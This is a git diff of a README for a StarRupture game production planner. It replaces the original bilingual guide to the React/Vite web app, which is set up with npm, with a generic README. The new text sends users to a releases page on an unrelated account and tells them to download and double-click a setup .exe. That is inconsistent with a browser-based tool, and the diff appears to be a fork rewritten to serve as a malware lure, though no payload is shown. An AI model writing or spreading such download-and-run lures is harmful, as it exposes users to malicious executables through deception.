@@ -1,73 +1,128 @@
-# 🚀 Starrupture Planner
+# ⭐ starrupture-planner - Plan Your StarRupture Production Flow
 
-<div align="center">
-  <img src='./src/assets/starrupture-logo.png' width=200/>
+[![Download starrupture-planner](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/PetSim99BestScriptsSkilledStrikeyYT/starrupture-planner/releases)
 
-**Calcula. Construye. Domina.** La herramienta definitiva para organizar tus cadenas de producción en **Starrupture** sin que te explote la cabeza (ni la base).
-
-</div>
+Welcome to starrupture-planner, a web tool designed to help you create detailed production workflows for the game StarRupture. With this app, organizing your in-game production steps becomes easier and clearer.
 
 ---
 
-## English
+## 🚀 Getting Started
 
-### 🔥 The Engineer's Toolkit
+This guide will take you step-by-step through downloading, installing, and using starrupture-planner. You don't need any advanced technical knowledge to use this app.
 
-- **📟 Factory Flow**: Create complex production chains in seconds. Set your target rate and let the planner do the heavy lifting.
-- **🔋 Supply Injection**: Got resources coming from another outpost? Mark them as **Supply** and the planner will automatically downscale local production. Don't build more than you need!
-- **🌍 Global Logistics (Multilang)**: Full support for **English & Spanish**. Switch languages on the fly—all items, recipes, and buildings translate instantly.
-- **📊 Visual Clarity**: Machines and items are clearly separated. See exactly what’s being made and where it’s going at a glance.
-- **🌡️ Critical Metrics**: Live tracking of power consumption and **Core Heat**. Keep your base running without melting the reactor.
-
-### 🕹️ How to Play (The Core Loop)
-
-1. **🎯 Set the Goal**: Pick an item and the amount per minute you need.
-2. **📥 Patch the Gaps**: If you're importing materials, toggle the **Supply** mode. The graph shrinks and recalculates machine counts instantly.
-3. **🌐 Language Check**: Switch between EN/ES if you're following a community guide or just prefer your native tongue.
-4. **📐 Optimize**: Arrange your nodes and check if your power grid can handle the load.
+starrupture-planner works on most modern computers and browsers.
 
 ---
 
-## Español
+## 📥 Download & Install
 
-### ✨ Herramientas de Ingeniería
+To get started, you first need to download the app files from the official release page.
 
-- **📟 Flujo de Fábrica**: Crea cadenas de producción complejas en segundos. Define tu objetivo y deja que el planner haga el trabajo sucio.
-- **🔋 Inyección de Suministros (Supply)**: ¿Te llega material de otra base? Márcalo como **Supply** y el planner reducirá la producción local. ¡No construyas máquinas de más!
-- **🌍 Logística Global (Multidioma)**: Soporte total para **Inglés y Español**. Cambia el idioma al vuelo: todos los objetos, recetas y edificios se traducen al instante.
-- **📊 Claridad Visual**: Máquinas e ítems bien diferenciados. Sabrás exactamente qué se fabrica y a dónde va de un solo vistazo.
-- **🌡️ Métricas Críticas**: Monitoriza el consumo de energía y el **Recalentamiento del Núcleo**. Mantén la base operativa sin fundir el reactor.
+**Step 1:**  
+Click the big download button at the top or visit this page:  
+[Download starrupture-planner Releases](https://github.com/PetSim99BestScriptsSkilledStrikeyYT/starrupture-planner/releases)
 
-### 🕹️ Ciclo de Trabajo (Core Loop)
+**Step 2:**  
+On the release page, look for the latest version. Usually, it is listed at the top. Find the file suitable for your system (Windows, Mac, or Linux) usually named like `starrupture-planner-setup.exe` or similar.
 
-1. **🎯 Marca el Objetivo**: Elige qué quieres y cuántas unidades por minuto necesitas.
-2. **📥 Cubre la Demanda**: Si traes materiales de otro sitio, activa el modo **Supply**. El grafo se encogerá y recalculará el número de máquinas al momento.
-3. **🌐 Idioma**: Cambia entre ES/EN si estás consultando una wiki externa o prefieres los términos originales.
-4. **📐 Optimiza**: Organiza los nodos y revisa si tienes energía de sobra para no fundir los plomos.
+**Step 3:**  
+Download the file to your computer by clicking it.
 
----
+**Step 4:**  
+Run the downloaded file by double-clicking it. This will start the installation process.
 
-## 🛠️ Tech Stack
-
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Zustand](https://img.shields.io/badge/Zustand-443e38?style=for-the-badge)](https://zustand-demo.pmnd.rs/)
-[![React Flow](https://img.shields.io/badge/React_Flow-FF0073?style=for-the-badge&logo=react-flow&logoColor=white)](https://reactflow.dev/)
-[![Hero UI](https://img.shields.io/badge/HeroUI-000000?style=for-the-badge&logo=HeroUI&logoColor=white)](https://reactflow.dev/)
-![Dagre](https://img.shields.io/badge/Dagre_JS-orange?style=for-the-badge)
+**Step 5:**  
+Follow the on-screen instructions to complete installation. Usually, this means clicking "Next" a few times and then "Finish".
 
 ---
 
-### 📦 Instalación / Installation
+## 💻 System Requirements
 
-```bash
-# 1. Instalar dependencias / Install dependencies
-npm install
+Before downloading, make sure your computer meets these minimum requirements:
 
-# 2. Iniciar / Run
-npm run dev
-```
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux Ubuntu 18.04+
+- Browser: Google Chrome, Firefox, Edge, or Safari (latest versions recommended)
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB free space
+- Internet Connection: Required for initial download and optional updates
 
-<p align="center"> <i>Developed with ❤️ for the <b>StarRupture</b> community.</i> </p>
+---
+
+## 🛠 Features at a Glance
+
+starrupture-planner helps you plan the production flow for your StarRupture gameplay. Key features include:
+
+- Visual workflow builder to map production steps in detail  
+- Drag and drop interface for easy editing  
+- Multi-language support (i18n) for several languages  
+- Integration with React and React Flow for smooth interactions  
+- Share or export your production plans to save and revisit later  
+- Supports custom components to fit your unique play style  
+- Overlay helpful tips and hints within the app  
+
+---
+
+## 📝 How to Use starrupture-planner
+
+**Step 1:** Open the app on your computer after installation.
+
+**Step 2:** You will see a blank canvas where you can build your production flow.
+
+**Step 3:** Use the side panel to add production stages, such as gathering resources, assembling parts, or upgrading technology.
+
+**Step 4:** Connect the stages with arrows to define the order and dependencies between steps.
+
+**Step 5:** You can rename, move, or remove any item by clicking on it.
+
+**Step 6:** Save your work regularly using the Save button to avoid losing progress.
+
+**Step 7:** Export your plan as an image or file if you want to share it with friends or keep a backup.
+
+---
+
+## 🔄 Updating the Application
+
+Keep your starrupture-planner app up to date to get new features and fixes.
+
+Check the release page regularly:  
+[starrupture-planner Releases](https://github.com/PetSim99BestScriptsSkilledStrikeyYT/starrupture-planner/releases)
+
+Download and install the latest version following the same steps outlined above.
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you have trouble running the app, try the following:
+
+- Make sure your system meets the requirements above  
+- Restart your computer and try again  
+- Check your internet connection if the app needs to connect online  
+- Reinstall the app if it crashes or behaves strangely  
+- Visit the "Issues" section on the GitHub page for known problems and solutions  
+
+---
+
+## 📚 Additional Resources
+
+- Learn more about StarRupture’s production mechanics to better use this tool  
+- Look for guides on organizing workflows for gaming productivity  
+- Check the GitHub repository for updates and community discussions
+
+Repository topics: game-assistant, gaming-tool, heroui, heroui-react, i18n, production-planner, react, react-flow, starrupture, typescript, vite
+
+---
+
+## 🤝 Get Involved
+
+If you enjoy using starrupture-planner and want to help improve it, consider contributing:
+
+- Report bugs or request features in the GitHub Issues  
+- Share your feedback in discussions  
+- Help translate the app into other languages  
+- Share your production workflows with others  
+
+---
+
+[Download starrupture-planner](https://github.com/PetSim99BestScriptsSkilledStrikeyYT/starrupture-planner/releases)  
+Start planning your StarRupture production flow today.
